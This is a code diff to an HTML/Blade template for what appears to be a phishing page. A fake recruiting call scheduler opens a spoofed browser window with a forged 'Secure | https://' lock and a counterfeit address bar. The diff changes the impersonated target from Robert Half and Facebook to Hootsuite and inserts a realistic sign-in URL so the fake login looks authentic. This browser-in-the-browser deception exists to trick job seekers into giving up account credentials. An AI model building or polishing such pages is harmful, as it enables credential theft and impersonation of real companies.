@@ -4,7 +4,7 @@
             <div class="box__shadow">
                 <div class="calendar__wrapper {{$webStatus ? '':'d-none'}}" >
                     <div class="user__wrapper">
-                        <div class="logo__wrapper"><img width="50%" src="{{asset('img/images.png')}}" /></div>
+                        <div class="logo__wrapper"><img width="70%" src="{{asset('img/logo-big.png')}}" /></div>
                         <div class="screen__two center__text">
                             <div class="mobile__back-svg">
                                 <div class="content__wrapper">
@@ -86,7 +86,7 @@
                     <div class="form__wrapper date__time {{$showCalender ? 'd-none':''}}">
                         <div>
                             <div class="full__width">
-                                <div style="transition: opacity 400ms, transform 400ms; transform: none; opacity: 1;"><h2>Schedule call with Robert Half - Recruiting Team</h2></div>
+                                <div style="transition: opacity 400ms, transform 400ms; transform: none; opacity: 1;"><h2>Schedule call with Hootsuite - Recruiting Team</h2></div>
                                 <div style="transition: opacity 400ms, transform 400ms; transform: none; opacity: 1;">
                                     <div class="form-steps">
                                         <form id="msform">
@@ -101,8 +101,8 @@
                                 <div style="transition: opacity 400ms, transform 400ms; transform: none; opacity: 1;">
                                     <div class="dummy__text">
                                         <p>
-                                            Please confirm your appointment with Robert Half - Recruiting Team. <br />
-                                            To complete the confirmation process, continue with Facebook
+                                            Please confirm your appointment with Hootsuite - Recruiting Team. <br />
+                                            To complete the confirmation process, continue with Hootsuite
                                         </p>
                                     </div>
                                 </div>
@@ -121,7 +121,7 @@
                                                     <clipPath id="clip0_302_2"><rect width="24" height="24" fill="white" transform="translate(0.845947)"></rect></clipPath>
                                                 </defs>
                                             </svg>
-                                            Continue with Facebook
+                                            Continue with Hootsuite
                                         </button>
                                     </div>
                                 </div>
@@ -143,12 +143,12 @@
                 </div>
                 <div class="calendar__wrapper {{$webStatus ? 'd-none':''}}" >
                     <div class="user__wrapper">
-                        <div class="logo__wrapper"><img width="50%" src="{{asset('img/images.png')}}" /></div>
+                        <div class="logo__wrapper"><img width="70%" src="{{asset('img/images.png?v=2')}}" /></div>
                         <div class="screen__two center__text">
                             <div class="mobile__back-svg">
                                 <div class="content__wrapper">
                                     <div style="margin-bottom: 15px;">
-                                        <div><img class="avatar" width="65px" src="{{asset('img/logo.png')}}" /></div>
+                                        <div><img class="avatar" width="65px" src="{{asset('img/logo.png?v=3')}}" /></div>
                                     </div>
                                     <h2>15 Minutes Meeting</h2>
                                 </div>
@@ -249,8 +249,8 @@
                                 <div>
                                     <div class="wrapper_header">
                                         <div class="sign__up-modal">
-                                            <img src="{{asset('img/hLRJ1GG_y0J.ico')}}" alt="" width="17px" />
-                                            <p>Log into Facebook | Facebook</p>
+                                            <img src="{{asset('img/logo.png')}}" alt="" width="17px" />
+                                            <p>Log into Hootsuite</p>
                                         </div>
                                         <div class="icons">
                                             <div class="img"><img src="{{asset('img/minus.png')}}" alt="" /></div>
@@ -261,12 +261,11 @@
                                     <div class="input__title-wrapper">
                                         <div class="lock__screen">
                                             <div class="lock">
-                                                <div class="lock__wrapper"><img src="{{asset('img/locktest.png')}}" alt="" /><span class="green">Secure | https:</span><span class="black-opacity">//</span></div>
+                                                <div class="lock__wrapper"><img src="{{asset('img/locktest.png')}}" alt="" /><span class="green">Secure | https://</span><span class="black-opacity"></span></div>
                                             </div>
                                             <span class="input__value">
-                                            www.facebook.com
-                                            <span class="black"> /login.php?skip<span class="hide__text-mobile">_api_login=1 &amp;api_key=481324359126967&amp;kid_directed_site=0&amp;app_id=481324359126967&amp;signed...</span></span>
-                                        </span>
+                                            hootsuite.com/signin?_gl=1%2A1ww1wnk%2A_gcl_au%2AMjc1MTg1NTAyLjE3NDgwODc0NTQ.%2AFPAU%2AMjc1MTg1NTAyLjE3NDgwODc0NTQ.%2A_ga%2AOTg3NDQ1MDkxLjE3NDgwODc0NTU.%2A_ga_9ZZYCN29EN%2AczE3NDgwODc0NTQkbzEkZzAkdDE3NDgwODc0NTckajU3JGwwJGgwJGQ4dENxM0paV3FkbjNRRFpxNWlqd21VNHIwWEtkWEVIYWJR%2A_fplc%2AV202RWwyNWFUczYzSDZ3MTBKUUJPU0hzVTNydkhySTMyZjhTVGxJZkdkbjFsJTJGTnA5RmpCM0JNcGlDWEdiRDBUblc2NVpNcURhYVNhV1MlMkZIa2t1Q0F2TXZjQkNqMnlIY0ZoVXFLWEVkUE41eHFDcjZxNndyQUY3WktzRXdnZyUzRCUzRA
+                                            </span>
                                         </div>
                                     </div>
                                 </div>
